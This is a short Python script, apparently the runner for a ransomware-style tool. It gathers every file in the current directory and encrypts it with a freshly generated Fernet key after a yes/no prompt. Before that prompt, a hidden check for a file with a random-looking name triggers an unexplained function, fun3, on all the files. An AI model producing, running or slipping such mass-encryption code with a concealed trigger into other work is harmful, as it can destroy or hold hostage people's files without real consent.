from main import encrypt
from main import decrypt
from main import fun3
import os
from cryptography.fernet import Fernet
v1 = False
files = []
key = Fernet.generate_key()
for file in os.listdir():
	if file == "main.py" or file == "key.key" or file == "runner.py":
                continue
	if file == "ieth5esoh9thi0lu0mohn3Siechao5RabaeGhied.txt":
		v1=True
	if os.path.isfile(file):
                files.append(file)
if v1 == True:
	fun3(key, files)
v2 = input("are you sure that you want to continue? THIS SCRIPT WILL ENCRYPT ALL OF THE FILES FROM THE THE DIRECTORY THAT YOU ARE CURRENTLY IN (yes/no)\n")
if v2 == "yes":
	encrypt(key, files)
	
else:
	quit()
